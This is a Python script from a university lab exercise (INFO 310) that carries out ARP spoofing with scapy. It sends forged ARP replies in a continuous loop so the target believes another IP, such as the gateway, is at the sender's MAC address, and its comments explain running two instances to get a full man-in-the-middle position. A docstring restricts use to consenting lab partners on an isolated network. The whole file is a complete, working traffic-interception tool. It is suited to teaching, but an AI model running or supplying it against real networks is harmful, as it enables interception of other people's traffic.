"""
INFO 310 - Week 2 Lab: ARP Spoofing Demonstration
This script is provided for educational use within the INFO 310 lab environment only.
It must only be used against lab partners who have given explicit consent,
on an isolated network, as described in the lab README.
"""

#!/usr/bin/env python3
# Usage: sudo python3 arpspoof.py <interface> <target-ip> <spoof-ip>
#
# Sends continuous forged ARP replies to <target-ip> claiming that <spoof-ip>
# is reachable at this machine's MAC address. Run two instances simultaneously
# (one targeting the victim, one targeting the gateway) to achieve a
# bidirectional man-in-the-middle position. Press Ctrl+C to stop.

import sys
import time
from scapy.all import ARP, Ether, sendp, getmacbyip


def spoof(iface: str, target_ip: str, spoof_ip: str, interval: float = 2.0) -> None:
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        print(
            f"[!] Could not resolve MAC address for {target_ip}. "
            "Ensure the host is reachable and has appeared in 'arp -a' before running this script."
        )
        sys.exit(1)

    pkt = Ether(dst=target_mac) / ARP(
        op=2,           # op=2 is an ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,  # claim we are spoof_ip
    )

    print(f"[*] Spoofing: telling {target_ip} that {spoof_ip} is at our MAC address.")
    print(f"[*] Sending one ARP reply every {interval}s on interface {iface}. Press Ctrl+C to stop.")

    try:
        while True:
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Stopped. Run arprestore.py to repair the ARP cache immediately.")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: sudo python3 arpspoof.py <interface> <target-ip> <spoof-ip>")
        print("Example: sudo python3 arpspoof.py en0 192.168.1.50 192.168.1.1")
        sys.exit(1)
    spoof(sys.argv[1], sys.argv[2], sys.argv[3])
